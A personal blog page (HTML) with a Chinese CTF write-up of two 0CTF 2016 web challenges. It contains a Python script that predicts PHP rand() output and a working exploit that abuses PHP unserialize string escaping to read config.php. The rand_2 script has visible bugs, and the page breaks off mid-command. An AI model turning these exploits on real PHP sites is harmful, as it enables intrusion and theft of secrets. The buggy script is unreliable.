@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>0CTF总结 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF总结">
+<meta property="og:url" content="http://0x48.pw/2016/03/14/0x12/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。">
+<meta property="og:updated_time" content="2016-03-28T10:19:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0CTF总结">
+<meta name="twitter:description" content="这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x12" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/14/0x12/" class="article-date">
+      <time datetime="2016-03-14T02:25:27.000Z" itemprop="datePublished">2016-03-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      0CTF总结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="rand-2"><a href="#rand-2" class="headerlink" title="rand_2"></a>rand_2</h1><p>题目源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>] &amp;&amp; time() - $_SESSION[<span class="string">'time'</span>] &gt; <span class="number">60</span>) &#123;</div><div class="line">	session_destroy();</div><div class="line">	<span class="keyword">die</span>(<span class="string">'timeout'</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$_SESSION[<span class="string">'time'</span>] = time();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> rand();</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'go'</span>])) &#123;</div><div class="line">	$_SESSION[<span class="string">'rand'</span>] = <span class="keyword">array</span>();</div><div class="line">	$i = <span class="number">5</span>;</div><div class="line">	$d = <span class="string">''</span>;</div><div class="line">	<span class="keyword">while</span>($i--)&#123;</div><div class="line">		$r = (string)rand();</div><div class="line">                $_SESSION[<span class="string">'rand'</span>][] = $r;</div><div class="line">                $d .= $r;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> md5($d);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'check'</span>])) &#123;</div><div class="line">	<span class="keyword">if</span> ($_GET[<span class="string">'check'</span>] === $_SESSION[<span class="string">'rand'</span>]) &#123;</div><div class="line">		<span class="keyword">echo</span> $flag;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'die'</span>;</div><div class="line">		session_destroy();</div><div class="line">	&#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这题看了国外的论文后知道了通过rand()随机出来的伪随机数有一个规律：<code>r[i] = r[i-3] + r[i-31]</code></p>
+<p>这里有一个需要注意的地方，题目服务器是ubuntu<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">php&gt;</span><span class="bash"> <span class="built_in">echo</span> getrandmax() </span></div><div class="line">2147483647</div></pre></td></tr></table></figure></p>
+<p>linux服务器随机数的范围是0-2147483647, 所以 <code>r[i] = (r[i-3] + r[i-31]) % 2147483648</code><br>payload:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import requests</div><div class="line">import re</div><div class="line">import hashlib</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">		<span class="keyword">self</span>.url = <span class="string">"http://202.120.7.202:8888"</span></div><div class="line">		<span class="keyword">self</span>.url2 = <span class="string">"http://202.120.7.202:8888/?go="</span></div><div class="line">		<span class="keyword">self</span>.url3 = <span class="string">"http://202.120.7.202:8888/?"</span></div><div class="line">		<span class="keyword">self</span>.s = requests.session()</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">		ran_num = []</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</div><div class="line">			req = <span class="keyword">self</span>.s.get(<span class="keyword">self</span>.url)</div><div class="line">			cont = req.content</div><div class="line">			<span class="symbol">try:</span></div><div class="line">				num = re.findall(r<span class="string">'(.+)&lt;code&gt;'</span>,cont)[<span class="number">0</span>]</div><div class="line">			<span class="symbol">except:</span></div><div class="line">				print i</div><div class="line">				exit(-<span class="number">1</span>)</div><div class="line">			ran_num(int(num))</div><div class="line"></div><div class="line">		req = <span class="keyword">self</span>.s.get(<span class="keyword">self</span>.url2)</div><div class="line">		cont = req.content</div><div class="line">		ran_num.append(int(cont[<span class="number">1</span><span class="symbol">:-</span><span class="number">32</span>]))</div><div class="line">		md5_num = cont[-<span class="number">32</span><span class="symbol">:</span>]</div><div class="line">		</div><div class="line">		go_num = []</div><div class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">			y = <span class="number">50</span> + x</div><div class="line">			tem_num1 = (ran_num[y-<span class="number">3</span>] + ran_num[y-<span class="number">31</span>]) % <span class="number">2147483648</span></div><div class="line">			ran_num.append(tem_num1)</div><div class="line">			go_num.append(str(tem_num1))</div><div class="line"></div><div class="line">		now_num = <span class="string">""</span>.join(go_num)</div><div class="line">		now_md5 = hashlib.md5(now_num).hexdigest()</div><div class="line">		<span class="keyword">if</span> md5_num == <span class="symbol">now_md5:</span></div><div class="line">			print <span class="string">"yes"</span></div><div class="line">			<span class="keyword">self</span>.num5 = <span class="keyword">self</span>.go_num</div><div class="line">			<span class="keyword">self</span>.suc()</div><div class="line">			<span class="keyword">break</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">suc</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">num5:</span></div><div class="line">			<span class="keyword">self</span>.url3 += <span class="string">"check[]="</span>+str(x) + <span class="string">"&amp;"</span></div><div class="line">		req = <span class="keyword">self</span>.s.get(<span class="keyword">self</span>.url3)</div><div class="line">		print req.content</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span>:</div><div class="line">	t = POC()</div><div class="line">	t.test()</div></pre></td></tr></table></figure></p>
+<p>然后我没做出来的问题在于。。。。我不会python..<br>error code:<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ran_num.append(int(cont[<span class="number">1</span>:-<span class="number">33</span>]))</div><div class="line">md5_num = cont[<span class="number">-33</span>:-<span class="number">1</span>]</div></pre></td></tr></table></figure></p>
+<p>然后这题发现没法复现，本地或是自己的服务器中，每次访问rand的seed都会变，就算keep-alive也是。。不知道题目服务器做了啥设置。。。</p>
+<h1 id="piapiapia"><a href="#piapiapia" class="headerlink" title="piapiapia"></a>piapiapia</h1><p>这题是代码审计，让我知道了原来我不会php<br>大致看了一遍可以看出一处问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// update.php</span></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</div><div class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</div></pre></td></tr></table></figure></p>
+<p>如果POST或者GET传参除了字符串还可以传递数组，所以如果nickname为数组的话，则可绕过该判断。update.php中之后是将输入序列化，在profile.php中反序列化。所以猜测是序列化这有洞，可是google搜了一通之后。得到的都是Joomla的反序列化截断漏洞。并没有得到啥有用的信息。。</p>
+<p>然后又有一发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</div><div class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</div><div class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</div></pre></td></tr></table></figure></p>
+<p>如果输入中有where则会变成hacker，多了一个字符，反序列化的时候会出错。。当时并没有想出利用方法。。之后看了wp之后才知道。</p>
+<p>payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import requests</div><div class="line">import re</div><div class="line">import base64</div><div class="line"></div><div class="line">class POC:</div><div class="line">	def __init__(self):</div><div class="line">		self.data = &#123;<span class="string">"username"</span>: <span class="string">"ddog1"</span>, <span class="string">"password"</span>: <span class="string">"ddog1"</span>&#125;</div><div class="line">		self.reg()</div><div class="line">		self.login()</div><div class="line">		self.fuck()</div><div class="line">		self.get_flag()	</div><div class="line">			</div><div class="line">	def reg(self):</div><div class="line">		url = <span class="string">"http://xxx/register.php"</span></div><div class="line">		req = requests.post(url, data=self.data)</div><div class="line">		<span class="keyword">if</span> req.status_code != <span class="number">200</span>:</div><div class="line">			print req.content</div><div class="line">			<span class="keyword">exit</span>(-<span class="number">1</span>)</div><div class="line">			</div><div class="line">	def login(self):</div><div class="line">		url = <span class="string">"http://xxx:8085/index.php"</span></div><div class="line">		req = requests.post(url, data=self.data)</div><div class="line">		<span class="keyword">if</span> not re.search(<span class="string">"UPDATE|Profile"</span>,req.content):</div><div class="line">			print req.content</div><div class="line">			print <span class="string">"login fail！"</span></div><div class="line">			<span class="keyword">exit</span>(-<span class="number">1</span>)</div><div class="line">		cookie = req.request.headers[<span class="string">'Cookie'</span>]</div><div class="line">		cookie = cookie.split(<span class="string">"="</span>)</div><div class="line">		self.cookie = &#123;cookie[<span class="number">0</span>]: cookie[<span class="number">1</span>]&#125;</div><div class="line">		</div><div class="line">	def fuck(self):</div><div class="line">		url = <span class="string">"http://xxx:8085/update.php"</span></div><div class="line">		payload = <span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;;'</span></div><div class="line">		payload = <span class="string">"where"</span> * len(payload) + payload</div><div class="line">		f = open(<span class="string">'/tmp/a.jpg'</span>,<span class="string">"w"</span>)</div><div class="line">		f.write(<span class="string">"fffff"</span>*<span class="number">1024</span>)</div><div class="line">		f.close()</div><div class="line">		files = &#123;<span class="string">"photo"</span>: (<span class="string">"fff.jpg"</span>, open(<span class="string">"/tmp/a.jpg"</span>,<span class="string">"rb"</span>))&#125;</div><div class="line">		data = &#123;<span class="string">"phone"</span>: <span class="string">"1"</span>*<span class="number">11</span>, <span class="string">"email"</span>: <span class="string">"fffff@qq.com"</span>, <span class="string">"nickname[]"</span>: payload&#125;</div><div class="line">		req = requests.post(url, data=data, cookies=self.cookie, files=files)</div><div class="line">		<span class="keyword">if</span> not re.search(<span class="string">"Success"</span>, req.content):</div><div class="line">			print req.content</div><div class="line">			<span class="keyword">exit</span>(-<span class="number">1</span>)</div><div class="line">	</div><div class="line">	def get_flag(self):</div><div class="line">		url = <span class="string">"http://xxx:8085/profile.php"</span></div><div class="line">		req = requests.get(url, cookies=self.cookie)</div><div class="line">		try:</div><div class="line">			base = re.findall(<span class="string">'base64,(.+?)"'</span>,req.content)[<span class="number">0</span>]</div><div class="line">		except:</div><div class="line">			print req.content</div><div class="line">			print <span class="string">"crack fail!"</span></div><div class="line">			<span class="keyword">exit</span>(-<span class="number">1</span>)</div><div class="line">		print <span class="string">"crack success!"</span></div><div class="line">		print <span class="string">"=========================="</span></div><div class="line">		print base64.b64decode(base)</div><div class="line">		print <span class="string">"=========================="</span></div><div class="line">		</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	POC()</div></pre></td></tr></table></figure></p>
+<p>这题没做出来就是对序列化的理解不清楚。比如一个序列化字符串<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"aaaaa"</span>;&#125;</div></pre></td></tr></table></figure></p>
+<p><strong>第一点</strong>，反序列化时，当反序列化完一个序列后，就会停止，比如<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"aaaaa"</span>;&#125;<span class="selector-tag">dfklasfjkal</span></div></pre></td></tr></table></figure></p>
+<p>上面的字符串进行反序列化和第一个字符串反序列化是一样的。。。</p>
+<p><strong>第二点</strong>，序列化字符串里没有转义字符。。所以说有了可以闭合序列化的可能，关键在于长度，序列一共由三部分组成，<code>数据类型:长度:数据</code>，看下面的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:5:"aa";&#125;";&#125;'</span>));</div><div class="line"><span class="comment">// out</span></div><div class="line"><span class="comment">// array(1) &#123;</span></div><div class="line"><span class="comment">//  [0]=&gt;</span></div><div class="line"><span class="comment">//  string(5) "aa\";&#125;"</span></div><div class="line"><span class="comment">// &#125;</span></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">then</div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:2:"aa";&#125;";&#125;'</span>));</div><div class="line"><span class="comment">// out</span></div><div class="line"><span class="comment">// array(1) &#123;</span></div><div class="line"><span class="comment">//  [0]=&gt;</span></div><div class="line"><span class="comment">//  string(2) "aa"</span></div><div class="line"><span class="comment">// &#125;</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这就是这题的重点了，但是怎么控制长度呢？就是通过 <code>where -&gt; hacker</code>  然后字符串逃逸。<br>所以得出payload:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">payload</span> = <span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;;'</span></div><div class="line"><span class="attr">payload</span> = <span class="string">"where"</span> * len(payload) + payload</div></pre></td></tr></table></figure></p>
+<p>然后是复现这题，在复现的过程中随便学习了下运维。。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 新建组</span></div><div class="line"><span class="meta">$</span><span class="bash"> groupadd ctf5</span></div><div class="line"><span class="meta">#</span><span class="bash"> 新建一个专门用于php-fpm的用户</span></div><div class="line"><span class="meta">$</span><span class="bash"> useradd ctf5 -M <span class="_">-s</span> /sbin/nologin -g ctf5</span></div><div class="line"><span class="meta">#</span><span class="bash"> 创建pid, sock文件</span></div><div class="line"><span class="meta">$</span><span class="bash"> touch /usr/<span class="built_in">local</span>/php/var/run/php-fpm-ctf5.pid</span></div><div class="line"><span class="meta">$</span><span class="bash"> touch /tmp/php-cgi-ctf5.sock</span></div><div class="line"><span class="meta">#</span><span class="bash"> sock是被nginx使用所以需要把所属用户和用户组改成和nginx一样</span></div><div class="line"><span class="meta">$</span><span class="bash"> chown www:www 